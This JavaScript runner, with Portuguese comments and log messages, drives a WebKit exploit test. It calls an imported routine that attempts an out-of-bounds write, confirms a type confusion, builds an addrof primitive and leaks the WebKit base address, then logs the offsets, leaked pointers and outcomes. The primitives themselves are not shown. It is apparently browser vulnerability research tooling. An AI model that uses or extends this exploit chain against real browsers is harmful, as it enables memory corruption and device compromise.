// js/script3/runAllAdvancedTestsS3.mjs (Adaptado para DirectRead Addrof)
import { logS3, PAUSE_S3, MEDIUM_PAUSE_S3 } from './s3_utils.mjs';
import { getOutputAdvancedS3, getRunBtnAdvancedS3 } from '../dom_elements.mjs';
import {
    executeTypedArrayVictimAddrofAndWebKitLeak_R43,
    FNAME_MODULE_TYPEDARRAY_ADDROF_V82_AGL_R43_WEBKIT // Importa o nome do módulo atualizado
} from './testArrayBufferVictimCrash.mjs';

async function runHeisenbugReproStrategy_TypedArrayVictim_R43() {
    const FNAME_RUNNER = "runHeisenbugReproStrategy_TypedArrayVictim_R43_DirectRead";
    logS3(`==== INICIANDO Estratégia de Reprodução do Heisenbug (${FNAME_RUNNER}) ====`, 'test', FNAME_RUNNER);
    const result = await executeTypedArrayVictimAddrofAndWebKitLeak_R43();

    const module_name_for_title = FNAME_MODULE_TYPEDARRAY_ADDROF_V82_AGL_R43_WEBKIT;

    if (result.errorOccurred) {
        logS3(`  RUNNER R43(DirectRead): Teste principal capturou ERRO: ${String(result.errorOccurred)}`, "critical", FNAME_RUNNER);
        document.title = `${module_name_for_title}: MainTest ERR!`;
    } else if (result) {
        let bestParamsMsg = 'N/A';
        if (result.oob_params_of_best_result) {
            bestParamsMsg = `Offset: ${result.oob_params_of_best_result.offset}, Valor: ${result.oob_params_of_best_result.value}`;
        }
        logS3(`  RUNNER R43(DirectRead): Completou. Melhores Parâmetros OOB: ${bestParamsMsg}`, "good", FNAME_RUNNER);
        logS3(`  RUNNER R43(DirectRead): Detalhes Sonda TC (Best): ${result.tc_probe_details ? JSON.stringify(result.tc_probe_details) : 'N/A'}`, "leak_detail", FNAME_RUNNER);

        const heisenbugSuccessfullyDetected = result.heisenbug_on_M2_in_best_result; // Nome antigo do campo, verificar se é heisenbug_on_M2_confirmed_by_tc_probe no novo result
        const addrofResult = result.addrof_result;
        const webkitLeakResult = result.webkit_leak_result;

        logS3(`  RUNNER R43(DirectRead): Heisenbug TC Sonda (Best): ${result.heisenbug_on_M2_confirmed_by_tc_probe ? "CONFIRMADA" : "NÃO CONFIRMADA"}`, result.heisenbug_on_M2_confirmed_by_tc_probe ? "vuln" : "warn", FNAME_RUNNER);

        if (addrofResult) {
            let addrofLogMsg = `  RUNNER R43(DirectRead): Teste Addrof (Best): ${addrofResult.msg}`;
            if (addrofResult.success) {
                addrofLogMsg += ` (Primeiro Endereço Vazado: ${addrofResult.leaked_object_addr || 'N/A'}. Candidatos: ${addrofResult.candidate_pointers_found?.length || 0})`;
            }
            logS3(addrofLogMsg, addrofResult.success ? "vuln" : "warn", FNAME_RUNNER);
            if (addrofResult.candidate_pointers_found && addrofResult.candidate_pointers_found.length > 0) {
                logS3(`    Candidatos Addrof (Best Iter): [${addrofResult.candidate_pointers_found.slice(0,5).join(", ")}${addrofResult.candidate_pointers_found.length > 5 ? "..." : ""}]`, "leak_detail", FNAME_RUNNER);
            }
        } else {
            logS3(`  RUNNER R43(DirectRead): Teste Addrof não produziu resultado ou não foi executado.`, "warn", FNAME_RUNNER);
        }

        if (webkitLeakResult) {
            logS3(`  RUNNER R43(DirectRead): Teste WebKit Base Leak (Best): ${webkitLeakResult.msg} (Base Candidata: ${webkitLeakResult.webkit_base_candidate || 'N/A'})`, webkitLeakResult.success ? "vuln" : "warn", FNAME_RUNNER);
        } else {
            logS3(`  RUNNER R43(DirectRead): Teste WebKit Base Leak não produziu resultado ou não foi executado.`, "warn", FNAME_RUNNER);
        }

        let finalTitleSegment = "No TC Confirmed";
        if (webkitLeakResult?.success) finalTitleSegment = "WebKitLeak SUCCESS!";
        else if (addrofResult?.success) finalTitleSegment = `Addrof OK (${addrofResult.candidate_pointers_found?.length || 0} cands)!`;
        else if (result.heisenbug_on_M2_confirmed_by_tc_probe) finalTitleSegment = "TC OK, Addrof Fail";
        document.title = `${module_name_for_title}_R43_DirectRead: ${finalTitleSegment}`;


        if (result.iteration_results_summary && result.iteration_results_summary.length > 0) {
            logS3(`  RUNNER R43(DirectRead): Sumário completo das iterações:`, "info", FNAME_RUNNER);
            result.iteration_results_summary.forEach((iter_sum, index) => {
                const tcSuccess = iter_sum.heisenbug_on_M2_confirmed_by_tc_probe;
                const addrofSuccessThisIter = iter_sum.addrof_result_this_iter?.success ?? false;
                const addrofCandsThisIter = iter_sum.addrof_result_this_iter?.candidate_pointers_found?.length || 0;
                const webkitLeakSuccess = iter_sum.webkit_leak_result_this_iter?.success ?? false;
                let logMsg = `    Iter ${index + 1} (Off ${iter_sum.oob_offset}, OOB ${iter_sum.oob_value}): TC=${tcSuccess}, AddrofIter=${addrofSuccessThisIter} (${addrofCandsThisIter} cands), WKLeakIter=${webkitLeakSuccess}`;
                if(iter_sum.error) logMsg += `, Err: ${iter_sum.error}`;
                logS3(logMsg, "info", FNAME_RUNNER);
            });
        }
    } else {
        document.title = `${module_name_for_title}_R43_DirectRead: Invalid Result Obj`;
    }
    logS3(`  Título da página final: ${document.title}`, "info", FNAME_RUNNER);
    await PAUSE_S3(MEDIUM_PAUSE_S3);
    logS3(`==== Estratégia de Reprodução do Heisenbug (${FNAME_RUNNER}) CONCLUÍDA ====`, 'test', FNAME_RUNNER);
}

export async function runAllAdvancedTestsS3() {
    const FNAME_ORCHESTRATOR = `${FNAME_MODULE_TYPEDARRAY_ADDROF_V82_AGL_R43_WEBKIT}_MainOrchestrator_DirectRead`;
    logS3(`==== INICIANDO Script 3 R43_DirectRead (${FNAME_ORCHESTRATOR}) ... ====`, 'test', FNAME_ORCHESTRATOR);
    await runHeisenbugReproStrategy_TypedArrayVictim_R43();
    logS3(`\n==== Script 3 R43_DirectRead (${FNAME_ORCHESTRATOR}) CONCLUÍDO ====`, 'test', FNAME_ORCHESTRATOR);
    const runBtn = getRunBtnAdvancedS3(); if (runBtn) runBtn.disabled = false;

    if (document.title.includes(FNAME_MODULE_TYPEDARRAY_ADDROF_V82_AGL_R43_WEBKIT) &&
        !document.title.includes("SUCCESS") && !document.title.includes("Fail") && !document.title.includes("OK") &&
        !document.title.includes("ERR") && !document.title.includes("Invalid")) {
        document.title = `${FNAME_MODULE_TYPEDARRAY_ADDROF_V82_AGL_R43_WEBKIT}_R43_DR_Done`;
    }
}
